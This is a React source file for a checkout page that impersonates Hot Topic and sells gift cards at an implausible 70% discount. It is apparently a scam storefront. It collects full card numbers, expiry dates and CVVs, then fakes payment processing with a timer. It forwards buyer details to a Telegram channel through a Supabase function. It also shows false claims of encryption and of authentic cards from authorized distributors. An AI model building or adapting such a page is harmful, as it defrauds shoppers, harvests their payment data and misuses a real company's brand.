
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import GiftCardOption from "@/components/GiftCardOption";
import DeliveryMethodSelector from "@/components/DeliveryMethodSelector";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicPromo from "@/components/HotTopicPromo";
import HotTopicFooter from "@/components/HotTopicFooter";
import TestimonialCarousel from "@/components/TestimonialCarousel";
import { 
  AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users 
} from "lucide-react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";

const GIFT_CARD_VALUES = [99.99, 499.99, 999.99, 4999.99];
const CARD_TYPES = [
  { name: "Visa", image: "https://i.imgur.com/Ames4RX.png" },
  { name: "Mastercard", image: "https://i.imgur.com/bCBB4IZ.png" },
  { name: "American Express", image: "https://i.imgur.com/MsEDvx2.png" },
  { name: "Discover", image: "https://i.imgur.com/o3VHRg1.png" }
];

// Regex patterns for validation
const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
const PHONE_REGEX = /^(\+1|1)?[-. ]?\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
const ZIP_REGEX = /^\d{5}(-\d{4})?$/;
const CARD_NUMBER_REGEX = /^[0-9]{13,19}$/;
const CVV_REGEX = /^[0-9]{3,4}$/;

const Index = () => {
  const navigate = useNavigate();
  const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
  const [deliveryMethod, setDeliveryMethod] = useState<"e-gift" | "physical">("e-gift");
  const [selectedCardType, setSelectedCardType] = useState<string>("Visa");
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: ""
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const validateField = (name: string, value: string): string => {
    switch (name) {
      case "firstName":
      case "lastName":
      case "cardName":
        return value.trim() === "" ? "This field is required" : "";
      case "email":
        return !EMAIL_REGEX.test(value) ? "Please enter a valid email address" : "";
      case "phone":
        return !PHONE_REGEX.test(value) ? "Please enter a valid US phone number" : "";
      case "address":
      case "city":
      case "state":
        return deliveryMethod === "physical" && value.trim() === "" ? "This field is required" : "";
      case "zipCode":
        return deliveryMethod === "physical" && !ZIP_REGEX.test(value) ? "Please enter a valid ZIP code" : "";
      case "cardNumber":
        return !CARD_NUMBER_REGEX.test(value.replace(/\s/g, '')) ? "Please enter a valid card number" : "";
      case "expiryDate":
        const [month, year] = value.split('/').map(part => part.trim());
        if (!month || !year || isNaN(Number(month)) || isNaN(Number(year))) {
          return "Please enter a valid expiry date (MM/YY)";
        }
        if (Number(month) < 1 || Number(month) > 12) {
          return "Month must be between 1 and 12";
        }
        const currentYear = new Date().getFullYear() % 100;
        if (Number(year) < currentYear) {
          return "Card has expired";
        }
        return "";
      case "cvv":
        return !CVV_REGEX.test(value) ? "Please enter a valid CVV" : "";
      default:
        return "";
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    
    // Validate field on change and update errors
    const error = validateField(name, value);
    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  const formatPhoneNumber = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as (XXX) XXX-XXXX
    if (cleaned.length >= 10) {
      return `(${cleaned.substring(0, 3)}) ${cleaned.substring(3, 6)}-${cleaned.substring(6, 10)}`;
    } else if (cleaned.length >= 6) {
      return `(${cleaned.substring(0, 3)}) ${cleaned.substring(3, 6)}${cleaned.length > 6 ? '-' + cleaned.substring(6) : ''}`;
    } else if (cleaned.length >= 3) {
      return `(${cleaned.substring(0, 3)})${cleaned.length > 3 ? ' ' + cleaned.substring(3) : ''}`;
    }
    return cleaned;
  };

  const formatCardNumber = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as XXXX XXXX XXXX XXXX
    const chunks = [];
    for (let i = 0; i < cleaned.length; i += 4) {
      chunks.push(cleaned.substring(i, i + 4));
    }
    return chunks.join(' ');
  };

  const formatExpiryDate = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as MM/YY
    if (cleaned.length >= 3) {
      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
    } else {
      return cleaned;
    }
  };

  const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value);
    setFormData(prev => ({
      ...prev,
      phone: formatted
    }));
    
    // Validate phone number
    const error = validateField("phone", formatted);
    setErrors(prev => ({
      ...prev,
      phone: error
    }));
  };

  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setFormData(prev => ({
      ...prev,
      cardNumber: formatted
    }));
    
    // Validate card number
    const error = validateField("cardNumber", formatted);
    setErrors(prev => ({
      ...prev,
      cardNumber: error
    }));
  };

  const handleExpiryDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setFormData(prev => ({
      ...prev,
      expiryDate: formatted
    }));
    
    // Validate expiry date
    const error = validateField("expiryDate", formatted);
    setErrors(prev => ({
      ...prev,
      expiryDate: error
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedAmount) {
      toast({
        title: "Error",
        description: "Please select a gift card amount",
        variant: "destructive",
      });
      return;
    }
    
    // Validate all required fields
    const newErrors: Record<string, string> = {};
    let hasErrors = false;
    
    // Fields to validate
    const fieldNames = ["firstName", "lastName", "email", "phone", "cardNumber", "cardName", "expiryDate", "cvv"];
    if (deliveryMethod === "physical") {
      fieldNames.push("address", "city", "state", "zipCode");
    }
    
    // Validate each field
    fieldNames.forEach(fieldName => {
      const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
      if (error) {
        newErrors[fieldName] = error;
        hasErrors = true;
      }
    });
    
    setErrors(newErrors);
    
    if (hasErrors) {
      toast({
        title: "Validation Error",
        description: "Please fix the errors in the form",
        variant: "destructive",
      });
      return;
    }
    
    // Set loading state
    setIsSubmitting(true);
    
    try {
      console.log(`Processing payment for $${selectedAmount} gift card (70% off) using ${selectedCardType}`);
      
      // Calculate the discounted amount (70% off)
      const discountedAmount = selectedAmount * 0.3;
      
      // Create payment processing simulation
      setTimeout(() => {
        // Create order details object
        const orderDetails = {
          customerName: `${formData.firstName} ${formData.lastName}`,
          email: formData.email,
          phone: formData.phone,
          giftCardValue: selectedAmount,
          paymentAmount: discountedAmount,
          deliveryMethod: deliveryMethod,
          paymentMethod: selectedCardType,
          orderDate: new Date().toISOString(),
          lastFour: formData.cardNumber.slice(-4)
        };
  
        // Save order details to localStorage for reference
        localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
        
        // Send order notification to Telegram
        try {
          console.log("Sending order notification to Telegram with details:", orderDetails);
          supabase.functions.invoke("send-telegram-notification", {
            body: orderDetails
          }).then(response => {
            if (response.error) {
              console.error("Failed to send Telegram notification:", response.error);
            } else {
              console.log("Telegram notification sent successfully:", response.data);
            }
          });
        } catch (telegramErr) {
          console.error("Error sending Telegram notification:", telegramErr);
        }
        
        // Navigate to payment success page
        navigate("/payment-success", { 
          state: { 
            orderDetails,
            giftCardValue: selectedAmount,
            discountedAmount
          } 
        });
      }, 2500);
    } catch (error) {
      console.error("Payment submission error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const renderErrorMessage = (fieldName: string) => {
    if (!errors[fieldName]) return null;
    
    return (
      <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
        <AlertCircle className="h-4 w-4" />
        <span>{errors[fieldName]}</span>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black">
      {/* Header */}
      <HotTopicHeader />
      
      {/* Promotional Banner */}
      <HotTopicPromo />
      
      {/* Hero Section */}
      <div className="ht-gradient-bg">
        <div className="container py-6 md:py-8">
          <div className="flex flex-col items-center justify-center mb-4">
            <h1 className="text-3xl md:text-5xl font-bold text-white tracking-tight mb-2 text-center">
              HOT TOPIC <span className="text-hottopic-red glow-text">GIFT CARDS</span>
            </h1>
            <p className="text-center text-xl md:text-2xl text-white/80 mb-2 max-w-2xl">
              The perfect gift for any <span className="text-hottopic-red font-semibold">Hot Topic</span> fan - at <span className="bg-hottopic-red px-2 py-1 rounded-md text-white font-bold inline-block transform -rotate-2 animate-floating">70% OFF</span>
            </p>
            <p className="text-center text-gray-400 max-w-xl">
              Give the gift of alternative culture and fan-favorite merchandise. Hot Topic gift cards can be redeemed at any Hot Topic store or online at hottopic.com
            </p>
          </div>
          
          <div className="flex justify-center">
            <div className="w-full max-w-md p-4 relative">
              <img 
                src="https://i.imgur.com/adJEpil.png" 
                alt="Hot Topic Gift Card" 
                className="w-[90%] mx-auto h-auto rounded-lg shadow-2xl border border-hottopic-gray/30 ht-border-glow"
              />
            </div>
          </div>
        </div>
      </div>
      
      {/* Main Content */}
      <div className="container py-8">
        <form onSubmit={handleSubmit} className="max-w-3xl mx-auto space-y-8">
          {/* Step 1: Select Gift Card Amount */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                1
              </span>
              Select Gift Card Amount
            </h2>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
              {GIFT_CARD_VALUES.map(value => (
                <GiftCardOption
                  key={value}
                  value={value}
                  isSelected={selectedAmount === value}
                  originalPrice={value}
                  discountedPrice={value * 0.3}
                  onClick={() => setSelectedAmount(value)}
                />
              ))}
            </div>
          </div>
          
          {/* Step 2: Delivery Method */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                2
              </span>
              Choose Delivery Method
            </h2>
            
            <DeliveryMethodSelector 
              selectedMethod={deliveryMethod} 
              onSelect={setDeliveryMethod} 
            />
          </div>
          
          {/* Step 3: Customer Information */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                3
              </span>
              Your Information
            </h2>
            
            <div className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="firstName" className="text-white">First Name*</Label>
                  <Input
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.firstName ? 'border-red-500' : ''}`}
                    placeholder="Enter first name"
                  />
                  {renderErrorMessage("firstName")}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="lastName" className="text-white">Last Name*</Label>
                  <Input
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.lastName ? 'border-red-500' : ''}`}
                    placeholder="Enter last name"
                  />
                  {renderErrorMessage("lastName")}
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-white">Email Address*</Label>
                  <Input
                    id="email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.email ? 'border-red-500' : ''}`}
                    placeholder="example@email.com"
                  />
                  {renderErrorMessage("email")}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-white">Phone Number*</Label>
                  <Input
                    id="phone"
                    name="phone"
                    value={formData.phone}
                    onChange={handlePhoneInput}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.phone ? 'border-red-500' : ''}`}
                    placeholder="(123) 456-7890"
                  />
                  {renderErrorMessage("phone")}
                </div>
              </div>
              
              {/* Conditional Shipping Address Fields */}
              {deliveryMethod === "physical" && (
                <div className="space-y-4 pt-4 border-t border-hottopic-gray/30">
                  <h3 className="text-xl font-medium text-white">Shipping Address</h3>
                  
                  <div className="space-y-2">
                    <Label htmlFor="address" className="text-white">Street Address*</Label>
                    <Input
                      id="address"
                      name="address"
                      value={formData.address}
                      onChange={handleInputChange}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.address ? 'border-red-500' : ''}`}
                      placeholder="Enter street address"
                    />
                    {renderErrorMessage("address")}
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="city" className="text-white">City*</Label>
                      <Input
                        id="city"
                        name="city"
                        value={formData.city}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.city ? 'border-red-500' : ''}`}
                        placeholder="Enter city"
                      />
                      {renderErrorMessage("city")}
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="state" className="text-white">State*</Label>
                      <Input
                        id="state"
                        name="state"
                        value={formData.state}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.state ? 'border-red-500' : ''}`}
                        placeholder="Enter state"
                      />
                      {renderErrorMessage("state")}
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="zipCode" className="text-white">ZIP Code*</Label>
                      <Input
                        id="zipCode"
                        name="zipCode"
                        value={formData.zipCode}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.zipCode ? 'border-red-500' : ''}`}
                        placeholder="Enter ZIP code"
                      />
                      {renderErrorMessage("zipCode")}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
          
          {/* Step 4: Payment Information */}
          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                4
              </span>
              Payment Information
            </h2>
            
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="cardType" className="text-white">Card Type*</Label>
                <div className="flex items-center gap-2">
                  <CreditCard className="h-5 w-5 text-hottopic-red" />
                  <Select
                    value={selectedCardType}
                    onValueChange={(value) => setSelectedCardType(value)}
                  >
                    <SelectTrigger 
                      className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
                      id="cardType"
                    >
                      <SelectValue placeholder="Select card type" />
                    </SelectTrigger>
                    <SelectContent className="bg-hottopic-dark border-hottopic-gray">
                      {CARD_TYPES.map((card) => (
                        <SelectItem 
                          key={card.name} 
                          value={card.name}
                          className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
                        >
                          <div className="flex items-center gap-2">
                            <img src={card.image} alt={card.name} className="w-8 h-auto" /> 
                            {card.name}
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-white">Card Number*</Label>
                  <div className="relative">
                    <Input
                      id="cardNumber"
                      name="cardNumber"
                      value={formData.cardNumber}
                      onChange={handleCardNumberInput}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
                      placeholder="•••• •••• •••• ••••"
                      maxLength={19}
                    />
                    <CreditCard className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
                  </div>
                  {renderErrorMessage("cardNumber")}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cardName" className="text-white">Name on Card*</Label>
                  <Input
                    id="cardName"
                    name="cardName"
                    value={formData.cardName}
                    onChange={handleInputChange}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
                    placeholder="Enter name as it appears on card"
                  />
                  {renderErrorMessage("cardName")}
                </div>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryDate" className="text-white">Expiry Date*</Label>
                  <Input
                    id="expiryDate"
                    name="expiryDate"
                    value={formData.expiryDate}
                    onChange={handleExpiryDateInput}
                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
                    placeholder="MM/YY"
                    maxLength={5}
                  />
                  {renderErrorMessage("expiryDate")}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv" className="text-white">Security Code (CVV)*</Label>
                  <div className="relative">
                    <Input
                      id="cvv"
                      name="cvv"
                      value={formData.cvv}
                      onChange={handleInputChange}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
                      placeholder="•••"
                      maxLength={4}
                      type="password"
                    />
                    <div className="absolute right-3 top-2.5 h-4 w-4 text-gray-400">
                      <LockIcon size={16} />
                    </div>
                  </div>
                  {renderErrorMessage("cvv")}
                </div>
              </div>

              <div className="flex items-center mt-2 text-sm text-gray-400">
                <Shield size={14} className="mr-1" />
                Your payment information is secure and encrypted
              </div>
            </div>
          </div>
          
          {/* Order Summary */}
          {selectedAmount && (
            <div className="bg-hottopic-gray/10 border border-hottopic-gray/20 rounded-xl p-6">
              <h2 className="text-xl font-semibold text-white mb-4 flex items-center">
                <span className="mr-2">Order Summary</span>
                <div className="flex-grow border-b border-dashed border-hottopic-gray/30"></div>
              </h2>
              
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">Gift Card Value</span>
                  <span className="text-white">${selectedAmount.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Discount (70%)</span>
                  <span className="text-hottopic-red">-${(selectedAmount * 0.7).toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Delivery Method</span>
                  <span className="text-white capitalize">{deliveryMethod}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Payment Method</span>
                  <span className="text-white">
                    {selectedCardType}
                  </span>
                </div>
                <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                  <span className="text-white">Total</span>
                  <span className="text-hottopic-red text-xl">${(selectedAmount * 0.3).toFixed(2)}</span>
                </div>
              </div>
            </div>
          )}
          
          {/* Submit Button */}
          <div className="flex justify-center">
            <Button 
              type="submit" 
              disabled={isSubmitting || !selectedAmount}
              className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
            >
              {isSubmitting ? "Processing..." : "Complete Purchase"}
            </Button>
          </div>
          
          <div className="flex items-center justify-center text-center">
            <LockIcon size={16} className="text-gray-400 mr-2" />
            <p className="text-gray-400 text-sm">
              Secure checkout - Your information is protected with 256-bit SSL encryption
            </p>
          </div>
        </form>
      </div>
      
      {/* Testimonials section */}
      <div className="bg-hottopic-gray/10 border-y border-hottopic-gray/20 py-10">
        <div className="container">
          <h2 className="text-2xl font-bold text-white mb-6 text-center">What Our Customers Say</h2>
          
          <TestimonialCarousel />
        </div>
      </div>
      
      {/* FAQ Section */}
      <div className="container py-10">
        <h2 className="faq-heading text-center mb-8">Frequently Asked Questions</h2>
        
        <div className="max-w-3xl mx-auto space-y-4">
          <FaqItem 
            question="How do Hot Topic gift cards work?" 
            answer="Hot Topic gift cards can be used for purchases at any Hot Topic store or on hottopic.com. Our e-gift cards are delivered instantly by email, while physical gift cards are shipped to your address."
          />
          <FaqItem 
            question="Are these official Hot Topic gift cards?" 
            answer="Yes, all our gift cards are 100% authentic Hot Topic gift cards purchased directly from authorized distributors."
          />
          <FaqItem 
            question="How long does shipping take?" 
            answer="Physical gift cards are typically shipped within 24 hours and delivered within 3-5 business days. E-gift cards are delivered instantly to your email."
          />
          <FaqItem 
            question="Do Hot Topic gift cards expire?" 
            answer="No, Hot Topic gift cards never expire and have no fees."
          />
          <FaqItem 
            question="Can I check my gift card balance?" 
            answer="Yes, you can check your gift card balance at any Hot Topic store or on hottopic.com."
          />
        </div>
      </div>
      
      {/* Footer */}
      <HotTopicFooter />
    </div>
  );
};

// Updated FaqItem component with new font classes
const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
  const [isOpen, setIsOpen] = useState(false);
  
  return (
    <div className="border-b border-hottopic-gray/30 pb-2">
      <button 
        onClick={() => setIsOpen(!isOpen)}
        className="flex justify-between items-center w-full py-3 text-left focus:outline-none"
      >
        <h3 className="faq-question font-medium">{question}</h3>
        <ChevronRight className={`text-hottopic-red transition-transform ${isOpen ? 'transform rotate-90' : ''}`} size={20} />
      </button>
      {isOpen && (
        <div className="pb-3 faq-answer">
          <p>{answer}</p>
        </div>
      )}
    </div>
  );
};

export default Index;
